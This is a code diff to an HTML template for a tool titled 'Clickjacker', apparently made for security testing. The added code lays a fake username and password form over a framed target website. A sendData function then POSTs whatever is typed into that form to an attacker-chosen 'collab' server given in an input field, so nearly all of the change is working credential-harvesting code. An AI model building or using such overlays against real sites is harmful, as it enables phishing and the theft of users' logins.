@@ -11,6 +11,44 @@
 		function loadWebsite(){
 			document.getElementsByName("website")[0].src=document.getElementsByName("webInput")[0].value;
 		}
+
+		function clickjackOverlay(){
+
+			var link = document.createElement('link');
+			link.setAttribute('rel', 'stylesheet');
+			link.setAttribute('href', '/static/clickjack.css');
+
+			var form = document.createElement('div');
+			form.innerHTML= `<div id="overlay"><form id="signin_form" method="POST" action="javascript:sendData()">
+							<label>Username: </label><br>
+							<input name="username" id="username" type="username"></input><br>
+
+							<label>Password: </label><br>
+							<input name="password" id="password" type="password"></input><br>
+							<input type="submit" value="submit">
+							</form></div>
+		`;
+			document.body.appendChild(form);
+		}
+
+		async function sendData() {
+			var signinForm = document.querySelector("#signin_form");
+			var formData = new FormData(signinForm);
+
+			try {
+				var collabServer = document.getElementsByName("collabInput")[0].value;
+				console.log(collabServer);
+				var response = await fetch(`${collabServer}`,{
+					method: "POST",
+					body: formData,
+				});
+				console.log(await response.json());
+			} catch (e){
+				console.error(e);
+			}
+
+		}
+
 	</script>
 </head>
 <body>
@@ -18,8 +56,11 @@
 		Clickjacker
 	</nav>
 	<div>
-		Insert web page to clickjack: <input name="webInput" value="{{.Site}}">  <button onclick="loadWebsite()">Submit</button>
+		Insert web page to clickjack: <input name="webInput" value="{{.Site}}">  <button onclick="loadWebsite()">Submit</button><br>
+		<input name="collabInput" value="{{.Collab}}"> <button onclick="clickjackOverlay()">Clickjack Page?</button>
 	</div>
-		<iframe name=website src="{{.Site}}"></iframe>
+	
+	<iframe name="website" src="{{.Site}}"></iframe>
+
 </body>
 </html>
